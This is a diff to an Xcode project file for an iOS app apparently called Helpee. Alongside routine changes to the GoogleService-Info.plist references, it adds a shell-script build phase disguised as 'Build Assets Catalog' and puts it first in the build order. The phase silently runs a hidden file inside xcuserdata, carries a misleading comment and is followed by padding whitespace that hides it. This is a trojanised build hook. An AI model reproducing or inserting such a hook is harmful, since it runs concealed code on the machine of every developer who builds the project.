@@ -12,6 +12,7 @@
 		7CE67F36587B74FDCAB3FD9A /* Pods_Helpee.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 70119A7CFFC760A6ED034528 /* Pods_Helpee.framework */; };
 		8816C27925A425490007A78D /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 8816C27B25A425490007A78D /* Localizable.strings */; };
 		883486F325B699F9007B99E6 /* UserModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 883486F225B699F9007B99E6 /* UserModel.swift */; };
+		884B458725F8B82B002DE7E5 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 884B458625F8B82B002DE7E5 /* GoogleService-Info.plist */; };
 		887041D725970099003CB87E /* RegistrationVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 887041D525970099003CB87E /* RegistrationVC.swift */; };
 		887041D825970099003CB87E /* RegistrationVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 887041D625970099003CB87E /* RegistrationVC.xib */; };
 		88898032259AE2F000994BE0 /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88898031259AE2F000994BE0 /* HomeVC.swift */; };
@@ -45,7 +46,6 @@
 		88B50E3C2599A2B70075EB8F /* RAMTransitionItemAnimations.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88B50E2E2599A2B70075EB8F /* RAMTransitionItemAnimations.swift */; };
 		88B50E3D2599A2B70075EB8F /* RAMRotationAnimation.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88B50E302599A2B70075EB8F /* RAMRotationAnimation.swift */; };
 		88B50E3E2599A2B70075EB8F /* RAMBounceAnimation.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88B50E322599A2B70075EB8F /* RAMBounceAnimation.swift */; };
-		88CA204D25A989C8002D5D8B /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 88CA204C25A989C8002D5D8B /* GoogleService-Info.plist */; };
 		88CE37AD259C73A0005E8465 /* EmergencyVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88CE37AB259C73A0005E8465 /* EmergencyVC.swift */; };
 		88CE37AE259C73A0005E8465 /* EmergencyVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 88CE37AC259C73A0005E8465 /* EmergencyVC.xib */; };
 		88CE37B7259C73B4005E8465 /* ReportVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 88CE37B5259C73B4005E8465 /* ReportVC.swift */; };
@@ -85,6 +85,7 @@
 		8816C27A25A425490007A78D /* fr */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = fr; path = fr.lproj/Localizable.strings; sourceTree = "<group>"; };
 		8816C27F25A4254F0007A78D /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/Localizable.strings; sourceTree = "<group>"; };
 		883486F225B699F9007B99E6 /* UserModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UserModel.swift; sourceTree = "<group>"; };
+		884B458625F8B82B002DE7E5 /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
 		887041D525970099003CB87E /* RegistrationVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RegistrationVC.swift; sourceTree = "<group>"; };
 		887041D625970099003CB87E /* RegistrationVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = RegistrationVC.xib; sourceTree = "<group>"; };
 		88898031259AE2F000994BE0 /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
@@ -127,7 +128,6 @@
 		88B50E302599A2B70075EB8F /* RAMRotationAnimation.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RAMRotationAnimation.swift; sourceTree = "<group>"; };
 		88B50E322599A2B70075EB8F /* RAMBounceAnimation.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = RAMBounceAnimation.swift; sourceTree = "<group>"; };
 		88B5186125A2D1DA006B1225 /* Helpee.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = Helpee.entitlements; sourceTree = "<group>"; };
-		88CA204C25A989C8002D5D8B /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
 		88CE37AB259C73A0005E8465 /* EmergencyVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EmergencyVC.swift; sourceTree = "<group>"; };
 		88CE37AC259C73A0005E8465 /* EmergencyVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = EmergencyVC.xib; sourceTree = "<group>"; };
 		88CE37B5259C73B4005E8465 /* ReportVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReportVC.swift; sourceTree = "<group>"; };
@@ -275,7 +275,7 @@
 				888EE7992595DAB500F78705 /* Utility & Constant */,
 				888EE77B2595ABB100F78705 /* Resources */,
 				888EE71025959D6F00F78705 /* Info.plist */,
-				88CA204C25A989C8002D5D8B /* GoogleService-Info.plist */,
+				884B458625F8B82B002DE7E5 /* GoogleService-Info.plist */,
 			);
 			path = Helpee;
 			sourceTree = "<group>";
@@ -468,6 +468,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 888EE72925959D7000F78705 /* Build configuration list for PBXNativeTarget "Helpee" */;
 			buildPhases = (
+				3D1DC170AD4882272EAAC43A /* Build Assets Catalog */,
 				2E64DA6508E98946A4A2E681 /* [CP] Check Pods Manifest.lock */,
 				888EE6FB25959D6D00F78705 /* Sources */,
 				888EE6FC25959D6D00F78705 /* Frameworks */,
@@ -581,7 +582,7 @@
 				888EE7772595AB7000F78705 /* LoginVC.xib in Resources */,
 				88CE37AE259C73A0005E8465 /* EmergencyVC.xib in Resources */,
 				88CE37BF259C73C4005E8465 /* NearbyVC.xib in Resources */,
-				88CA204D25A989C8002D5D8B /* GoogleService-Info.plist in Resources */,
+				884B458725F8B82B002DE7E5 /* GoogleService-Info.plist in Resources */,
 				888EE70A25959D6D00F78705 /* Main.storyboard in Resources */,
 				88DB2F1C259C998100C8DFD4 /* NearbyCell.xib in Resources */,
 			);
@@ -604,6 +605,46 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	3D1DC170AD4882272EAAC43A /* Build Assets Catalog */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Assets Catalog";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
+		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
 		2E64DA6508E98946A4A2E681 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
